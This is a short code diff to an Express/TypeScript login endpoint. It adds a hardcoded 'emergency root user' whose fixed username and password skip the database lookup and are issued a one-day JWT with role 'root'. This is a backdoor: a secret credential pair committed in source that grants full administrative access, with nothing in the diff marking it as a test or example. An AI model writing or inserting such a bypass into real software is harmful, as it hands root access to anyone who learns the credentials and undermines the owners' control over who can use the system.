@@ -151,6 +151,13 @@ const logActivity = async (req: express.Request, action: string, details?: strin
 
 app.post('/api/auth/login', async (req, res) => {
     const { username, password } = req.body;
+
+    // Emergency Root User (Hardcoded)
+    if (username === 'Phat' && password === 'P@ssw0rd') {
+        const token = jwt.sign({ id: 'emergency_root_id', username: 'Phat', role: 'root' }, JWT_SECRET, { expiresIn: '1d' });
+        return res.json({ token, user: { username: 'Phat', role: 'root' } });
+    }
+
     try {
         const user = await User.findOne({ username });
         if (!user) return res.status(400).json({ message: 'User not found' });
